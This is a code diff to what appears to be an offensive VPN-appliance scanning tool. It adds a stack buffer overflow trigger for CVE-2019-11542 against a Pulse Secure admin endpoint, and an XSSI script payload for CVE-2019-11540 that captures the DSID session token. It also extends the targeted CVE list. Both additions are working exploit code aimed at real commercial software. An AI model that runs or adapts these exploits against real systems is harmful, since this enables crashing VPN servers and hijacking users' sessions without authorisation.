@@ -8,8 +8,9 @@ if sys.version_info < (3, 0):
 requests.packages.urllib3.disable_warnings()
 
 
-cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381'
-	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510']
+cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381',
+	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510',
+	  'CVE-2019-11542', 'CVE-2019-11540']
 # Updating this list ...
 vpnsub = ['vpn', 'covpn', 'tcovpn',
           'panvpn', 'vpn-blr', 'vpn-blr1',
@@ -225,6 +226,30 @@ def cve_2019_11510(host, port):
 	
     else:
 	print('The host %s is not vulnerable to CVE-2018-13379' % host)
+		  
+
+		  
+def cve_2019_11542(host, port):
+    url = 'https://%s%s/dana-admin/auth/hc.cgi?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&policyid=0' % (host, port)
+    r = requests.get(url, verify=False)
+    print('Stack buffer overflowed the host %s' % host)
+		  
+		  
+		  
+def cve_2019_11540(host, port):
+    payload = '''<script src="https://%s%s/dana/cs/cs.cgi?action=appletobj"></script>
+<script>
+    window.onload = function() {
+        window.document.writeln = function (msg) {
+            if (msg.indexOf("DSID") >= 0) alert(msg)
+        }
+        ReplaceContent()
+    }
+</script>''' % (host, port)
+    print('Got the XSSI script payload for %s:' % host)
+    print('  - - - - - - - - - -%s' % red)
+    print(payload)
+    print('%s  - - - - - - - - - -' % white)
 	
 	
 	
